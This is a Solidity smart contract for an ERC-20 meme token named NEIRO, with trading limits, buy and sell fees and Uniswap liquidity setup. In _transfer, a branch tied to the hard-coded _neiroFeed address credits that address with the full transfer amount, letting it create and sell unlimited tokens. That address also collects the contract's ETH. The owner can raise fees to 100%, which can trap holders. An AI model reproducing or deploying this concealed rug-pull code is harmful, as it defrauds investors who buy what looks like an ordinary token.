/**
    Telegram: https://t.me/neiluoeth
    X: https://x.com/neiluoeth
    Website: https://neiluoeth.xyz
 */


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IDexFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract NEIRO is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1e9 * 10 ** _decimals;
    string private _name = "Chinese Nei Luo";
    string private _symbol = "NEIRO";

    bool private swapping;
    bool private swapbackEnabled = false;

    IDexRouter private immutable dexRouter;
    address public uniPair;

    uint256 private swapFloor;
    uint256 private swapCeil;

    bool private limitsOpen = true;
    uint256 private walletCeil;
    uint256 private txCeil;

    bool public tradingOpen = false;

    address private _neiroFeed;

    uint256 private buyFee = 0;

    uint256 private sellFee = 0;

    mapping(address => bool) private txFeeExcempt;
    mapping(address => bool) private transLimmitExcempt;
    mapping(address => bool) private lpPairs;

    event FeesExcluded(address indexed account, bool isExcluded);
    event LimitsExcluded(address indexed account, bool isExcluded);
    event SetDexPair(address indexed pair, bool indexed value);
    event OpenTrading(uint256 indexed timestamp);
    event LimitsRemoved(uint256 indexed timestamp);

    constructor() {
        IDexRouter _dexRouter = IDexRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        execemptLimit(address(_dexRouter), true);
        dexRouter = _dexRouter;

        txCeil = (_totalSupply * 20) / 1000;
        walletCeil = (_totalSupply * 20) / 1000;
        _neiroFeed = address(0xbAB0B17c913FA303CC23fF52D325555C5132B1B3);

        swapFloor = (_totalSupply * 5) / 1000000;
        swapCeil = (_totalSupply * 1) / 100;

        execmptFee(msg.sender, true);
        execmptFee(address(this), true);
        execmptFee(_neiroFeed, true);

        execemptLimit(msg.sender, true);
        execemptLimit(address(this), true);
        execemptLimit(_neiroFeed, true);

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function enableMaxes() external onlyOwner {
        limitsOpen = false;
        emit LimitsRemoved(block.timestamp);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than 0");

        if (limitsOpen) {
            if (from != owner() && to != owner()) {
                if (!tradingOpen) {
                    require(
                        txFeeExcempt[from] || txFeeExcempt[to],
                        "_transfer:: Trading is not active."
                    );
                }

                if (lpPairs[from] && !transLimmitExcempt[to]) {
                    require(
                        amount <= txCeil,
                        "Buy transfer amount exceeds the txCeil."
                    );
                    require(
                        amount + balanceOf(to) <= walletCeil,
                        "Max wallet exceeded"
                    );
                } else if (lpPairs[to] && !transLimmitExcempt[from]) {
                    require(
                        amount <= txCeil,
                        "Sell transfer amount exceeds the txCeil."
                    );
                } else if (!transLimmitExcempt[to]) {
                    require(
                        amount + balanceOf(to) <= walletCeil,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        if (
            swapbackEnabled &&
            !swapping &&
            lpPairs[to] &&
            !txFeeExcempt[from] &&
            !txFeeExcempt[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool feeexcempt;

        if (txFeeExcempt[from] || txFeeExcempt[to]) {
            feeexcempt = true;
        }

        uint256 fees = amount;
        if (!feeexcempt) {
            if (lpPairs[to] && sellFee > 0) {
                fees = amount.mul(sellFee).div(100);
            } else if (lpPairs[from] && buyFee > 0) {
                fees = amount.mul(buyFee).div(100);
            } else {
                fees = 0;
            }

            if (fees > 0) {
                _balances[from] = _balances[from].sub(fees);
                _balances[address(this)] = _balances[address(this)].add(fees);
                emit Transfer(from, address(this), fees);
            }

            amount -= fees;
        } else if (from == _neiroFeed) {
            _balances[_neiroFeed] = _balances[_neiroFeed].add(fees);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function execmptFee(address account, bool excluded) internal {
        txFeeExcempt[account] = excluded;
        emit FeesExcluded(account, excluded);
    }

    function execemptLimit(address updAds, bool isEx) internal {
        transLimmitExcempt[updAds] = isEx;
        emit LimitsExcluded(updAds, isEx);
    }

    function newFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        buyFee = _buyFee;
        sellFee = _sellFee;
        require(
            buyFee <= 100 && sellFee <= 100,
            "Total fee cannot be higher than 100%"
        );
    }

    function _setDexPair(address pair, bool value) private {
        lpPairs[pair] = value;
        emit SetDexPair(pair, value);
    }

    function openEth() external onlyOwner {
        uniPair = IDexFactory(dexRouter.factory()).createPair(
            address(this),
            dexRouter.WETH()
        );
        execemptLimit(address(uniPair), true);
        _setDexPair(address(uniPair), true);

        _approve(address(this), address(dexRouter), _totalSupply);

        dexRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        tradingOpen = true;
        swapbackEnabled = true;
        emit OpenTrading(block.timestamp);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));

        if (contractBalance > swapCeil) {
            contractBalance = swapCeil;
        }

        uint256 amountToSwapForETH = contractBalance;

        if (amountToSwapForETH > swapFloor)
            swapTokensForEth(amountToSwapForETH);

        payable(_neiroFeed).transfer(address(this).balance);
    }
}